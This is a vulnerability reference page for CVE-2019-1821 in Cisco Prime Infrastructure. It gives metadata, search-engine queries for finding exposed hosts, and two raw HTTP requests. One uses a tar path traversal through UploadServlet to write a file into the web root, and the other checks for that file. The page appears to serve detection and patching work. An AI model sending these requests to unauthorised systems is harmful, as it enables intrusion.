---
layout: post
cve_id: CVE-2019-1821
title: Cisco Prime Infrastructure and Cisco Evolved Programmable Network Manager -
  Remote Code Execution
pcap: true
pcap_path: /pcaps/2019/CVE-2019-1821.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2019/CVE-2019-1821.yaml
snort2_rule: N/A
snort3_rule: N/A
author: _0xf4n9x_
severity: critical
impact: 'Authenticated attackers can upload malicious files to execute code with root-level
  privileges on the underlying operating system, leading to complete system compromise
  and potential network infiltration.

  '
remediation: 'Apply the latest security patches provided by Cisco to mitigate this
  vulnerability.

  '
reference:
- https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20190515-pi-rce
- https://srcincite.io/blog/2019/05/17/panic-at-the-cisco-unauthenticated-rce-in-prime-infrastructure.html
- https://nvd.nist.gov/vuln/detail/CVE-2019-1821
- http://packetstormsecurity.com/files/153350/Cisco-Prime-Infrastructure-Health-Monitor-TarArchive-Directory-Traversal.html
- https://github.com/ARPSyndicate/kenzer-templates
classification:
  cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2019-1821
  cwe-id: CWE-20
  epss-score: 0.94044
  epss-percentile: 0.99892
  cpe: cpe:2.3:a:cisco:evolved_programmable_network_manager:*:*:*:*:*:*:*:*
metadata:
  max-request: 2
  vendor: cisco
  product: evolved_programmable_network_manager
  shodan-query: http.title:"prime infrastructure"
  fofa-query: title="prime infrastructure"
  google-query: intitle:"prime infrastructure"
tags:
- cve
- cve2019
- packetstorm
- rce
- fileupload
- unauth
- intrusive
- cisco
- vkev
- vuln
---

## üîç Vulnerability Description
Cisco Prime Infrastructure (PI) and Cisco Evolved Programmable Network (EPN) Manager could allow an authenticated, remote attacker to execute code with root-level privileges on the underlying operating system. This vulnerability exist because the software improperly validates user-supplied input. An attacker could exploit this vulnerability by uploading a malicious file to the administrative web interface. A successful exploit could allow the attacker to execute code with root-level privileges on the underlying operating system.

## üåê HTTP Request
```nohighlight
POST /servlet/UploadServlet HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.9) Gecko/2008052906 Firefox/3.0
Connection: close
Content-Length: 292
Accept-Encoding: gzip, deflate
Compressed-Archive: false
Content-Type: multipart/form-data; boundary=871a4a346a547cf05cb83f57b9ebcb83
Destination-Dir: tftpRoot
Filecount: 1
Filename: test.tar
Filesize: 10240
Primary-IP: 127.0.0.1
--871a4a346a547cf05cb83f57b9ebcb83
Content-Disposition: form-data; name="files"; filename="test.tar"
../../opt/CSCOlumos/tomcat/webapps/ROOT/test.txt0000644000000000000000000000000400000000000017431 0ustar  0000000000000038FXtYHBey4wkKJ14Mh3YUpll4y
--871a4a346a547cf05cb83f57b9ebcb83--
```

```nohighlight
GET /test.txt HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.8
Connection: close
Accept-Encoding: gzip
```

